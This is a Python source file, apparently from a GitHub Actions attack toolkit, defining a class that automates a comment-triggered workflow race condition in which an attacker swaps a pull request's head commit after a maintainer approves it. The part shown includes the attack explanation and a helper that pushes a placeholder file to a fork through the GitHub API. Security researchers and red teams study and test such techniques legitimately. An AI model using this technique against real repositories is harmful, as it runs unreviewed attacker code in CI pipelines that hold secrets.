"""
Copyright 2024, Adnan Khan

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""
import base64
import requests

from datetime import datetime, timedelta

from gatox.attack.attack import Attacker

class CommentRaceAttack(Attacker):
    """This class automates steps to abuse GitHub Actions workflows that
    use comment-based gating.

    The issue arises because workflows that run on `issue_comment` events
    do not have direct access to the PR head SHA reference at the time of comment
    creation. This means that the workflow needs to retrieve the PR head SHA or ref
    in some way.

    If a workflow allows maintainers or those with write access to trigger a workflow,
    then an attacker can constantly poll for that comment trigger and then immediately
    update their PR head to a different commit. This will cause the workflow to run on
    the attacker's commit instead of the original PR head commit which the maintainer
    may have reviewed.
    """

    @staticmethod
    def create_file_in_fork(fork_repo, fork_branch, token):
        """Uses the GitHub API to update a file in the fork head branch.

        Since time is critical, we capture the SHA256 hash of the file we want to replace
        when we start polling. This way, if the file already exists then we can update it in a
        single API request.
        """
        url = f"https://api.github.com/repos/{fork_repo}/contents/test.txt"
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }
        data = {
            "message": "[skip ci] Create test.txt",
            "content": base64.b64encode("Test new file.".encode()).decode(),
            "branch": fork_branch
        }
        response = requests.put(url, headers=headers, json=data)
        if response.status_code == 201:
            print("test.txt file created in the fork repository.")
        else:
            print("Failed to create test.txt file in the fork repository.")
            print("Response:", response.json())